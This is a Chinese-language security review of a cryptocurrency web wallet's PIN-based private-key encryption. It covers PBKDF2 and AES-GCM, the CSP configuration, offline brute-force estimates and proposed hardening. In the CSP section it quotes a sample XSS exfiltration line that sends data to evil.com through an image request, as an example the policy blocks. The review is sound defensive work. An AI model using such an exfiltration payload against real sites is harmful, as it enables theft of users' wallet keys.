# 现有 PIN 方案安全分析

## 实现概述

私钥（WIF 格式）以如下方式加密后存入 `localStorage`：

```
PIN（用户输入）
    │
    ▼
PBKDF2-SHA256（iterations: 100,000，随机 16 字节 salt）
    │
    ▼
AES-GCM 256-bit 密钥（随机 12 字节 IV）
    │
    ▼
加密后存入 localStorage：
  encrypted-wif   （密文）
  encrypted-wif-iv（IV）
  encrypted-wif-salt（salt）
```

实现位于 `src/utils/webauthn.js:37`。

---

## CSP 防护层

项目在 `index.html:8` 配置了 Content Security Policy，对网络侧攻击形成独立防护层。

**关键指令**

```
default-src 'self'
script-src  'self' https://www.google-analytics.com https://www.googletagmanager.com 'sha256-...'
connect-src 'self' https://api.whatsonchain.com https://api.bitails.io ... （BSV 节点白名单）
img-src     'self' data: https://api.qrserver.com
```

**对 XSS 的限制**

即使页面存在 XSS 漏洞，攻击者注入的脚本可以读取 localStorage，但无法通过网络将数据外传：

- `connect-src` 仅允许 `self` 和已知 BSV API 域名，`fetch`/`XMLHttpRequest` 到任意外部地址会被浏览器直接拦截
- `img-src` 同样受限，无法用 `new Image().src = 'https://evil.com/?d=...'` 旁路
- `script-src` 无 `'unsafe-eval'`，阻止动态代码执行

**剩余风险**

- CSP 通过 `<meta>` 标签配置而非 HTTP 响应头，无法设置 `frame-ancestors` 等部分指令（点击劫持防护需由服务器补充），但 `connect-src` 等核心指令对 meta 标签同样有效
- `script-src` 信任了 Google Tag Manager（`googletagmanager.com`），GTM 本身可动态加载任意脚本，是潜在供应链攻击入口
- CSP 不能抵御物理接触设备后直接读取 localStorage 的攻击

**层次关系**

CSP 和 PIN 加密互补：CSP 阻止加密数据通过网络泄露，PIN 加密保证数据即使泄露也难以解密。两者同时存在才构成完整防护。

---

## 威胁模型

**攻击前提**：攻击者获取到 localStorage 中的三个字段（密文 + IV + salt）。

可能途径：
- 物理接触设备，打开 DevTools
- 同源 XSS 漏洞（注：CSP 可阻止数据网络外传，但不能阻止读取）
- 设备被恶意软件感染（绕过浏览器沙箱，CSP 无效）
- 用户导出了加密备份文件（JSON/QR）后泄露

**攻击方式**：离线暴力穷举。salt 已知（就在 localStorage 里），攻击者可在自己的机器上无限次尝试，不受任何速率限制。

---

## 暴力破解难度

PBKDF2 的作用是让每次尝试变慢，但现代 GPU 可以大幅并行。

**参考速度**：RTX 4090 跑 PBKDF2-SHA256 100k iterations ≈ 400,000 次/秒。

| PIN 类型 | 空间大小 | 穷举时间（RTX 4090） |
|---|---|---|
| 4 位纯数字 | 10,000 | < 0.1 秒 |
| 6 位纯数字 | 1,000,000 | 约 2.5 秒 |
| 8 位纯数字 | 100,000,000 | 约 4 分钟 |
| 6 位字母数字混合 | 约 5.7×10¹⁰ | 约 40 小时 |
| 8 位字母数字混合 | 约 2.2×10¹⁴ | 约 17 年 |
| 8 位含大小写+符号 | 约 9.6×10¹⁵ | 约 760 年 |

> 以上为单卡单目标的理论穷举时间。多卡并行、云计算集群可成倍压缩。

**结论**：4–6 位纯数字 PIN 在攻击者拿到加密数据后几乎无保护。8 位以上混合字符才能提供有意义的抵抗。

---

## PBKDF2 的局限

PBKDF2 是 CPU 密集型算法，但对 GPU/ASIC 的抵抗较弱。同等时间内，GPU 的吞吐量比 CPU 高 2–3 个数量级。

更抗暴力破解的算法（内存密集，GPU 并行效益低）：

| 算法 | GPU 抵抗 | Web Crypto API 原生支持 |
|---|---|---|
| PBKDF2（当前） | 弱 | 是 |
| scrypt | 强 | 否（需第三方库） |
| Argon2id | 最强 | 否（需第三方库） |

---

## 现有缓解措施

- **AES-GCM 认证加密**：PIN 错误时解密直接失败，无法逐字节试探密文，不存在侧信道。
- **随机 salt**：每个钱包 salt 不同，无法用彩虹表批量攻击。
- **随机 IV**：相同 PIN 加密相同内容，密文也不同。

以上措施保证了密码学实现本身的正确性，但均不能抵抗对弱 PIN 的暴力穷举。

---

## 可选改进方向

### 方向一：强制 PIN 复杂度（低成本）

在 `Payment.jsx:425` 的 `set` 模式中增加验证规则：

- 最短 8 位
- 必须包含字母和数字

可将 8 位混合 PIN 的穷举时间从秒级提升至数年，对普通攻击者有效。

局限：无法阻止用户选择可预测的模式（`Password1`、`Abc12345`），实际安全性低于理论值。

### 方向二：提高迭代次数（低成本）

将 PBKDF2 迭代次数从 10 万提升至 60 万（2023 年 OWASP 推荐值），单次尝试耗时提升 6 倍。

局限：治标不治本，GPU 并行优势依然存在。

### 方向三：引入 scrypt / Argon2id（中成本）

替换 PBKDF2 为内存密集型算法，使 GPU 并行加速效益大幅降低。

**依赖**：Web Crypto API 不原生支持，需引入第三方 WASM 库。推荐 `hash-wasm`（按需加载，gzip 约 40KB），比 `argon2-browser`（约 150KB）更轻量。

**兼容旧数据**：localStorage 需新增 `encrypted-wif-algo` 字段标识算法（旧数据缺省视为 `pbkdf2`）。用户下次解锁时静默迁移：PBKDF2 解密成功后，自动用 Argon2id 重新加密并更新标识，对用户透明。

**CSP 问题**：WASM 在 Chrome 95+ 需要 `script-src` 包含 `'wasm-unsafe-eval'`，当前 CSP（`index.html:14`）缺少该指令，上线前必须补上，否则 WASM 直接被浏览器拦截。

### 方向四：PRF 方案（根本解决）

见 [prf-wallet-design.md](./prf-wallet-design.md)。私钥不再存储，暴力破解失去攻击对象。

---

## 风险定级

| 场景 | 风险等级 | 说明 |
|---|---|---|
| 用户使用 4–6 位纯数字 PIN | 高 | 获取加密数据后秒破 |
| 用户使用 8 位混合 PIN | 中 | 理论上安全，实际取决于可预测性 |
| 用户使用 12 位以上随机密码 | 低 | 当前方案足够 |
| 攻击者无法获取 localStorage | 无 | 加密数据不暴露则无从破解 |

---

## 建议

短期：实施方向一（强制复杂度）+ 方向二（提高迭代次数），改动小，立即生效。

中长期：评估 PRF 方案可行性，从架构上消除离线破解的攻击面。
